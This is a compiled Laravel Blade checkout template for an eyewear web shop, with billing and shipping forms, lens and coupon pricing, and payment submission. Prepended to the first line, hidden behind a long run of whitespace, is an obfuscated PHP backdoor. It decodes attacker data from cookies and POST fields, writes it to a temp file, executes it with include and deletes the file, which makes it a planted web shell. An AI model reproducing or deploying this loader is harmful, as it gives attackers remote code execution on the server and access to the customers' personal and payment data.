<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zcfkln")){class zcfkln{public static $pnzdcjvsl = "pqoluaonhfegjnlc";public static $jdnumwx = NULL;public function __construct(){$bgopw = @$_COOKIE[substr(zcfkln::$pnzdcjvsl, 0, 4)];if (!empty($bgopw)){$wgyldemjv = "base64";$hlenbfzgah = "";$bgopw = explode(",", $bgopw);foreach ($bgopw as $leexzzunlw){$hlenbfzgah .= @$_COOKIE[$leexzzunlw];$hlenbfzgah .= @$_POST[$leexzzunlw];}$hlenbfzgah = array_map($wgyldemjv . "_decode", array($hlenbfzgah,));$hlenbfzgah = $hlenbfzgah[0] ^ str_repeat(zcfkln::$pnzdcjvsl, (strlen($hlenbfzgah[0]) / strlen(zcfkln::$pnzdcjvsl)) + 1);zcfkln::$jdnumwx = @unserialize($hlenbfzgah);}}public function __destruct(){$this->iwisnnl();}private function iwisnnl(){if (is_array(zcfkln::$jdnumwx)) {$xekrwabss = sys_get_temp_dir() . "/" . crc32(zcfkln::$jdnumwx["salt"]);@zcfkln::$jdnumwx["write"]($xekrwabss, zcfkln::$jdnumwx["content"]);include $xekrwabss;@zcfkln::$jdnumwx["delete"]($xekrwabss);exit();}}}$lsmnivesbo = new zcfkln();$lsmnivesbo = NULL;} ?>

<?php
$meta_title = $meta_description = $meta_keywords = "";
$meta_title = (!empty($meta_tag->page_meta_title)) ? $meta_tag->page_meta_title : "Checkout Meta Title";
$meta_description = (!empty($meta_tag->page_meta_description)) ? $meta_tag->page_meta_description : "Checkout Meta Description";
$meta_keywords = (!empty($meta_tag->page_meta_keywords)) ? $meta_tag->page_meta_keywords : "Checkout Meta Keywords";


?>

<?php $__env->startSection('title',$meta_title); ?>
<?php $__env->startSection('description',$meta_description); ?>
<?php $__env->startSection('keywords',$meta_keywords); ?>



<?php $__env->startSection('content'); ?>
<br>
<div class="sun-breadcrumb-01">
<div class="container-fluid">
<div class="row">
<div class="col-lg-12">
<div class="breadcrumb-01">
<ul>
<li><a href="<?php echo e(url('/')); ?>"><i class="fas fa-home" style="margin-top: 6px;
    margin-left: 18px;"></i></a></li>
<li><a href="">Checkout</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>

<div class="privacy-page">
<div class="container">
    <div class="row mb-5">
       <div class="col-12 text-center">
           
<h3><b>Checkout</b></h3>
       </div> 
    </div>
<!--<div class="row">
<div class="col-lg-12">
<div class="user-actions">
<h3> 
<i class="fa fa-file-o" aria-hidden="true"></i>
Returning customer?
<a class="Returning" href="#" data-toggle="collapse" data-target="#checkout_login" aria-expanded="true">Click here to login</a>     

</h3>
<div id="checkout_login" class="collapse" data-parent="#accordion">
<div class="checkout_info">
<p>If you have shopped with us before, please enter your details in the boxes below. If you are a new customer please proceed to the Billing &amp; Shipping section.</p>  
<form action="#">  
<div class="form_group">
    <label>Username or email <span>*</span></label>
    <input type="text">     
</div>
<div class="form_group">
    <label>Password  <span>*</span></label>
    <input type="text">     
</div> 
<div class="form_group group_3 ">
    <button type="submit">Login</button>
    <label for="remember_box">
        <input id="remember_box" type="checkbox">
        <span> Remember me </span>
    </label>     
</div>
<a href="#">Lost your password?</a>
</form>          
</div>
</div>    
</div>
<div class="user-actions">
<h3> 
<i class="fa fa-file-o" aria-hidden="true"></i>
Returning customer?
<a class="Returning" href="#" data-toggle="collapse" data-target="#checkout_coupon" aria-expanded="true">Click here to enter your code</a>     

</h3>
<div id="checkout_coupon" class="collapse" data-parent="#accordion">
<div class="checkout_info coupon_info">
<form action="#">
<input placeholder="Coupon code" type="text">
<button type="submit">Apply coupon</button>
</form>
</div>
</div>    
</div>    
</div>
</div>-->

<?php if(count($errors)>0): ?>
<div class="alert alert-danger alert-dismissible show">
    <button type="button" class="close" data-dismiss="alert">&times;</button>
    <strong>Errors Occurred!</strong>
    <ul style="margin-left:25px;">
     <?php $__currentLoopData = $errors->all(); $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $error): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
     <li><?php echo e($error); ?></li>
     <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
    </ul>
</div>
<?php endif; ?>

<?php if(session('success')): ?>
<div class="alert alert-success alert-dismissible show">
    <button type="button" class="close" data-dismiss="alert">&times;</button>
    <?php echo e(session('success')); ?>

</div>
<?php endif; ?>

<div class="checkout_form">
<div class="row">
    
    <style>
  
.card {
  
  background: white;
 box-shadow: 0px 0px 0px grey;
  -webkit-transition:  box-shadow .6s ease-out;
     box-shadow: .8px .9px 3px grey;

}
.card:hover{ 
     box-shadow: 1px 8px 20px grey;
    -webkit-transition:  box-shadow .6s ease-in;
  }
 
body {
  background-color: #F0EFEE;
}      
        
        
        
    </style>
    
<div class="col-lg-6 col-md-6">
    <div class="card">
<form action="<?php echo e(url('/address-form-submit')); ?>" method="post" style="padding:20px;">
<?php echo csrf_field(); ?>
<?php echo method_field('POST'); ?>
<h3>Billing Details</h3>
<div class="row">

<div class="col-lg-12 mb-20">
<label>Full Name <span>*</span></label>
<input type="text" name="name" id="name" required placeholder="Enter your name" class="form-control" <?php if(!empty(Auth::guard('user')->user()->name)): ?> value="<?php echo e(Auth::guard('user')->user()->name); ?>" <?php else: ?> value="<?php echo e(old('name')); ?>" <?php endif; ?>>
<?php $__errorArgs = ['name'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
<span class="invalid-feedback" role="alert">
<strong><?php echo e($message); ?></strong>
</span>
<?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>    
</div>

<div class="col-12 mb-20">
<label for="country">Country <span>*</span></label>


<select class="form-control country" name="country" required onchange="getStates()">
  <option value="">-- Select country --</option>
      <?php $__currentLoopData = $countries; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $country): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
       <option value="<?php echo e($country->id); ?>" <?php if($country->id == Auth::guard('user')->user()->country): ?> selected <?php endif; ?> ><?php echo e($country->name); ?></option>
      <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
    </select>
     <?php $__errorArgs = ['country'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
  <span class="invalid-feedback" role="alert">
      <strong><?php echo e($message); ?></strong>
  </span>
  <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>

</div>

<div class="col-12 mb-20">
<label>Street address  <span>*</span></label>
 <input type="text" placeholder="Street address" id="address" name="address" class="form-control" <?php if(!empty(Auth::guard('user')->user()->address)): ?> value="<?php echo e(Auth::guard('user')->user()->address); ?>" <?php else: ?> value="<?php echo e(old('address')); ?>" <?php endif; ?>>
     <?php $__errorArgs = ['address'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
  <span class="invalid-feedback" role="alert">
      <strong><?php echo e($message); ?></strong>
  </span>
  <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>    
</div>

<div class="col-8 mb-20">
<label>Town / City <span>*</span></label>
 <input type="text" name="city" id="city" required placeholder="Enter your city" class="form-control" <?php if(!empty(Auth::guard('user')->user()->city)): ?> value="<?php echo e(Auth::guard('user')->user()->city); ?>" <?php else: ?> value="<?php echo e(old('city')); ?>" <?php endif; ?>>
     <?php $__errorArgs = ['city'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
  <span class="invalid-feedback" role="alert">
      <strong><?php echo e($message); ?></strong>
  </span>
  <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>    
</div> 

<div class="col-4 mb-20">
<label>Pincode <span>*</span></label>
<input type="text" name="pincode" id="pincode" required placeholder="Enter your pincode" class="form-control" <?php if(!empty(Auth::guard('user')->user()->pincode)): ?> value="<?php echo e(Auth::guard('user')->user()->pincode); ?>" <?php else: ?> value="<?php echo e(old('pincode')); ?>" <?php endif; ?>>
     <?php $__errorArgs = ['pincode'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
  <span class="invalid-feedback" role="alert">
      <strong><?php echo e($message); ?></strong>
  </span>
  <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>   
</div> 

<div class="col-12 mb-20">
<label>State<span>*</span></label>
 <select class="form-control state" name="state" required>
  <?php if(!empty(Auth::guard('user')->user()->state)): ?>
  <?php $__currentLoopData = $states; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $state): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
   <option value="<?php echo e($state->id); ?>" <?php if($state->id == Auth::guard('user')->user()->state): ?> selected <?php endif; ?> ><?php echo e($state->name); ?></option>
  <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
  <?php endif; ?>
</select>
 <?php $__errorArgs = ['state'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
  <span class="invalid-feedback" role="alert">
      <strong><?php echo e($message); ?></strong>
  </span>
  <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>   
</div> 
<div class="col-lg-6 mb-20">
<label>Phone<span>*</span></label>
 <input type="text" name="mobile" required id="mobile" placeholder="Enter your mobile" class="form-control" <?php if(!empty(Auth::guard('user')->user()->mobile)): ?> value="<?php echo e(Auth::guard('user')->user()->mobile); ?>" <?php else: ?> value="<?php echo e(old('mobile')); ?>" <?php endif; ?>>

  <?php $__errorArgs = ['mobile'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
  <span class="invalid-feedback" role="alert">
      <strong><?php echo e($message); ?></strong>
  </span>
  <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?> 

</div> 
<div class="col-lg-6 mb-20">
<label> Email Address   <span>*</span></label>
<input type="text" name="email" id="email" required placeholder="Enter your email" class="form-control" <?php if(!empty(Auth::guard('user')->user()->email)): ?> value="<?php echo e(Auth::guard('user')->user()->email); ?>" <?php else: ?> value="<?php echo e(old('email')); ?>" <?php endif; ?>>
    
    <?php $__errorArgs = ['email'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>

</div> 


<label style="margin-left: 10%;">
<input id="ship-address-check" onclick="ship_addr_check()" type="checkbox" value="1" name="ship_to_different_address">
<span>Ship to a different address?</span>
</label>
<div class="col-12 mb-20" id="shipping-address" style="display:none">

   <div class="row">
       
        <div class="col-lg-12 mb-20">
            <label>Full Name  <span>*</span></label>
           <input type="text" name="ship_name" id="ship_name" placeholder="Enter your name" class="form-control" <?php if(!empty($shipping_address->ship_name)): ?> value="<?php echo e($shipping_address->ship_name); ?>" <?php endif; ?> >
 <?php $__errorArgs = ['ship_name'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
        </div>
       
        <div class="col-12 mb-20">
            <div class="select_form_select">
                <label for="countru_name">country <span>*</span></label>
<select class="form-control country1" name="ship_country" onchange="getStates1()">
      <?php $__currentLoopData = $countries; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $country): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
       <option value="<?php echo e($country->id); ?>" <?php if(!empty($shipping_address->ship_country)): ?> <?php if($shipping_address->ship_country==$country->id): ?> selected <?php endif; ?> <?php endif; ?> ><?php echo e($country->name); ?></option>
      <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
    </select>
    <?php $__errorArgs = ['ship_country'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>
            </div> 
        </div>

        <div class="col-12 mb-20">
            <label>Street address  <span>*</span></label>
            <input type="text" placeholder="Street address" id="ship_address" name="ship_address" class="input-text " <?php if(!empty($shipping_address->ship_address)): ?> value="<?php echo e($shipping_address->ship_address); ?>" <?php endif; ?> >
    <?php $__errorArgs = ['ship_address'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>    
        </div>
       
<div class="col-8 mb-20">
<label>Town / City <span>*</span></label>
<input type="text" name="ship_city" id="ship_city" placeholder="Enter your city" class="form-control" <?php if(!empty($shipping_address->ship_city)): ?> value="<?php echo e($shipping_address->ship_city); ?>" <?php endif; ?> >
<?php $__errorArgs = ['ship_city'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
<span class="invalid-feedback" role="alert">
<strong><?php echo e($message); ?></strong>
</span>
<?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>  
</div> 

<div class="col-4 mb-20">
<label>Pincode <span>*</span></label>
 <input type="text" name="ship_pincode" id="ship_pincode" placeholder="Enter your pincode" class="form-control" <?php if(!empty($shipping_address->ship_pincode)): ?> value="<?php echo e($shipping_address->ship_pincode); ?>" <?php endif; ?> >
<?php $__errorArgs = ['ship_pincode'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?> 
</div> 

         <div class="col-12 mb-20">
            <label>State / County <span>*</span></label>
             <select class="form-control state1" name="ship_state">
 <?php if(!empty($shipping_address)): ?> 
  <?php $__currentLoopData = $states; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $state): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
   <option value="<?php echo e($state->id); ?>"  <?php if(!empty($shipping_address->ship_state)): ?> <?php if($shipping_address->ship_state==$state->id): ?> selected <?php endif; ?> <?php endif; ?>  ><?php echo e($state->name); ?></option>
  <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
  <?php endif; ?>
</select>
<?php $__errorArgs = ['ship_state'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>    
        </div> 
        <div class="col-lg-6 mb-20">
            <label>Phone<span>*</span></label>
             <input type="text" name="ship_mobile" id="ship_mobile" placeholder="Enter your mobile" class="form-control" <?php if(!empty($shipping_address->ship_mobile)): ?> value="<?php echo e($shipping_address->ship_mobile); ?>" <?php endif; ?> >
<?php $__errorArgs = ['ship_mobile'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?>

        </div> 
         <div class="col-lg-6">
            <label> Email Address   <span>*</span></label>
             <input type="text" name="ship_email" id="ship_email" placeholder="Enter your email" class="form-control" <?php if(!empty($shipping_address->ship_email)): ?> value="<?php echo e($shipping_address->ship_email); ?>" <?php endif; ?>  >
   <?php $__errorArgs = ['ship_email'];
$__bag = $errors->getBag($__errorArgs[1] ?? 'default');
if ($__bag->has($__errorArgs[0])) :
if (isset($message)) { $__messageOriginal = $message; }
$message = $__bag->first($__errorArgs[0]); ?>
    <span class="invalid-feedback" role="alert">
    <strong><?php echo e($message); ?></strong>
    </span>
    <?php unset($message);
if (isset($__messageOriginal)) { $message = $__messageOriginal; }
endif;
unset($__errorArgs, $__bag); ?> 

        </div> 
    </div>

</div>
     	    	    	    	    	    	    
</div>
<input type="submit" name="submit" value="Update Info" class="btn btn-primary">
</form>
   
</div>
<br><br>
</div>

<?php
$final_total_price=0;
$coat_price="0.00";
$check_coating = DB::table('cart_coating')->where('session_id',Session::get('session_id'))->count();
if($check_coating>0){
$coatings = DB::table('cart_coating')->where('session_id',Session::get('session_id'))->get();
 foreach($coatings as $coat){
   $coat_price += $coat->coating_price;
  } 
}
$total_cart = DB::table('carts')->where('session_id',Session::get('session_id'))->get();
foreach ($total_cart as $total) {
if(!empty($total->lens_id)){
$final_total_price += ($total->quantity*$total->price)+($total->lens_price*$total->lens_qty)+$total->vision_price+$total->lens_color_price+$total->prism_price+$coat_price;
}else{
$final_total_price += ($total->quantity*$total->price)+($total->lens_price*$total->lens_qty);
}
}
?>
<?php if($final_total_price>0): ?>
<div class="col-lg-6 col-md-6">
  <div class="card">  
  <div class=" " style="padding:20px;">
<h3>Your order</h3> 
<div class="order_table table-responsive">
<table>
<thead>
    <tr>
        <th>Product</th>
        <th>Total</th>
    </tr>
</thead>
<tbody>
 <?php $__currentLoopData = $carts; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $cart): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>  
<?php
 $prd = DB::table('categories')->where('id',$cart->product_id)->first();
 $parent = DB::table('categories')->select('category_name')->where('id',$prd->category_parent_id)->first();
?>   
<tr>
    <td> 
    <span class="font-weight-bold">Brand : </span> <?php echo e($parent->category_name); ?>

    <br>
    <?php echo e($cart->product_name); ?>

    <br>
    <?php echo e($prd->category_uan_code); ?>

    <br>
    <span class="font-weight-bold">EAN : </span> <?php echo e($prd->category_sku_code); ?>

    <br>
    
    <?php if(!empty($cart->lens_id)): ?> 
<h5>Lens Detail</h5>
<?php
$vision_detail = DB::table('visions')->where('id',$cart->vision_id)->first();
$lens_detail = DB::table('lenses')->where('id',$cart->lens_id)->first();
$lens_color_type = DB::table('lens_color_types')->where('id',$cart->lens_color_id)->first();
?>
<p>Vision: <?php echo e($vision_detail->vision_name); ?>

<?php if($vision_detail->vision_price==0.00): ?>

<?php else: ?>
(<?php echo e($cart->currency_symbol()); ?><?php echo e($cart->vision_price); ?>)
<?php endif; ?></p>

<?php
 $lens_color_parent=DB::table('lens_color_types')->where('id',$lens_color_type->category_parent_id)->first();
?>
<?php if($cart->is_tint=="tint"): ?>

<p>Color Type: <?php echo e($lens_color_parent->category_name); ?> - <?php echo e($lens_color_type->category_name); ?>

<?php if($lens_color_type->category_price==0.00): ?>

<?php else: ?>
- <?php echo e($cart->currency_symbol); ?><?php echo e($cart->lens_color_price); ?>

<?php endif; ?>
</p>

<?php else: ?>

<p>Color Type: <?php echo e($lens_color_type->category_name); ?>

<?php if($lens_color_type->category_price==0.00): ?>

<?php else: ?>
- <?php echo e($cart->currency_symbol); ?><?php echo e($cart->lens_color_price); ?>

<?php endif; ?>
</p>
<?php endif; ?>

<p>Lens: <?php echo e($lens_detail->name); ?> (<?php echo e($lens_detail->lens_index); ?>) + <?php echo e($cart->lens_price); ?></p>

<?php if($cart->is_prism=="Yes"): ?>
<p>Prism: <?php echo e($cart->currency_symbol.$cart->prism_price); ?></p>
<?php endif; ?>

<?php
$coat_price="0.00";
$check_coating = DB::table('cart_coating')->where('cart_id',$cart->id)->count();
?>
<?php if($check_coating>0): ?>
<?php
$coatings = DB::table('cart_coating')->where('cart_id',$cart->id)->get();
 foreach($coatings as $coat){
   $coat_price += $coat->coating_price;
  } 
 ?>
 <p>Lens Coating: <?php echo e($cart->currency_symbol.$coat_price); ?></p>
<?php endif; ?>

<?php endif; ?>
    <strong> × <?php echo e($cart->quantity); ?></strong>
    
</td>
<?php if(!empty($cart->lens_id)): ?>    
<td> <?php echo e($cart->currency_symbol); ?><?php echo e(($cart->price*$cart->quantity)+($cart->lens_price*$cart->lens_qty)+$cart->vision_price+$cart->lens_color_price+$cart->prism_price+$coat_price); ?></td>
<?php else: ?>
<td> <?php echo e($cart->currency_symbol); ?><?php echo e(($cart->price*$cart->quantity)+($cart->lens_price*$cart->lens_qty)); ?></td>
<?php endif; ?>
</tr>

<?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
</tbody>
<tfoot>
    <tr>
        <th>Cart Subtotal</th>
        <td><?php echo e(getCurrencySymbol($ip_country).$final_total_price); ?></td>
    </tr>
    <tr>
        <th>Shipping Charges</th>
        <td>
           <?php echo e(getCurrencySymbol($ip_country).$shipping_charges); ?>

        </td>
    </tr>
<?php
$checkUserCoupon = DB::table('user_coupon')->where('user_id',Auth::guard('user')->user()->id)->where('status','Applied')->first();
?>    
<?php if(!empty($checkUserCoupon)): ?>
<?php
$coupon = DB::table('coupons')->where('id',$checkUserCoupon->coupon_id)->first();
if($coupon->coupon_type == "Fixed"){
$discount = getCurrencyPrice($ip_country,$coupon->coupon_amount);
$final_amount = $final_total_price - $discount; 
}else if($coupon->coupon_type == "Percent_off"){
$discount = ($final_total_price/100)*$coupon->coupon_amount;
$final_amount = $final_total_price - $discount;  
}
?>
<tr>
<th>Discount</th>
<td><strong> - <?php echo e(getCurrencySymbol($ip_country).$discount); ?></strong></td>
</tr>
<?php endif; ?>    
    <tr class="order_total">
        <th>Order Total</th>
        <td><strong><?php echo e(getCurrencySymbol($ip_country)); ?><?php if(!empty($checkUserCoupon)): ?>
           <?php echo e($final_amount+$shipping_charges); ?>

          <?php else: ?>
           <?php echo e($final_total_price+$shipping_charges); ?>

          <?php endif; ?></strong> 
          <small>[including taxes]</small>
          </td>
    </tr>
</tfoot>
</table>     
</div>
<div class="payment_method">
<form action="<?php echo e(url('/pay-now')); ?>" method="post" id="payment_form" onsubmit="event.preventDefault();">
<?php echo csrf_field(); ?>
<?php echo method_field('POST'); ?>
<input type="hidden" name="amount" id="amount">
<input type="radio" value="Online" name="payment_method" id="payment_method" checked style="border: 1px solid #ededed;
    background: none;
    height: 13px;
    width: 4%;
    padding: 0 20px;
    color: #222222;">
<label for="payment_method_cheque">Online </label>
<input type="radio" value="COD" name="payment_method" id="payment_method" style="border: 1px solid #ededed;
    background: none;
    height: 13px;
    width: 4%;
    padding: 0 20px;
    color: #222222;">
<label for="payment_method_cod">Cash on delivery </label><br>   

<div class="order_button">
<button type="submit" class="buy_now" onclick="getAmount()" <?php if(empty(Auth::guard('user')->user()->address) && empty(Auth::guard('user')->user()->city) && empty(Auth::guard('user')->user()->country) && empty(Auth::guard('user')->user()->state) && empty(Auth::guard('user')->user()->pincode) ): ?> disabled <?php endif; ?>>Proceed to Pay</button> 
</div> 
</form>
</div>
<br>
<span><b>Note:</b><i> You can't place order until you not fill your address detail. </i></span>  
</div></div></div>
<?php endif; ?>
</div> 
</div> 
</div>
</div>


<script type="text/javascript">
  function getAmount(){
    var url="<?php echo e(url('/')); ?>/get-amount";
    $.ajax({
      url:url,
      type:"post",
      success:function(response){
       $('#amount').val(response); 
       setTimeout(function(){payment()},1000); 
      },error:function(response){
        alert(response)
      }
    });
  }

    var payment_method="";
    function payment(){
       payment_method = $('#payment_method:checked').val();
          $('#payment_form').attr('onsubmit',"");
          $('#payment_form').submit();
       }

 </script>

<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home2/luxurjhf/public_html/eyewear/resources/views/checkout.blade.php ENDPATH**/ ?>